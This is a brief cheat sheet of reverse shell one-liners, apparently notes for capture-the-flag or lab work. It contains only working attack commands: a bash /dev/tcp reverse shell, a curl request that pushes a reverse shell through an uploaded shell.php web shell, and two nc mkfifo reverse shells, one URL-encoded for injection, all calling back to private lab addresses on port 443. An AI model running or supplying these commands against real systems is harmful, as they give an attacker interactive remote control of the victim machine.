_____

```bash
bash -c 'bash -i >& /dev/tcp/10.10.14.11/443 0>&1'
```

https://www.revshells.com/
# Bash

```bash
curl 10.10.11.116/shell.php --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/10.10.14.7/443 0>&1"'
```

# Nc mkfifo 

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.14.2 443 >/tmp/f
```
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>%261|nc 10.10.14.21 443 >/tmp/f
```
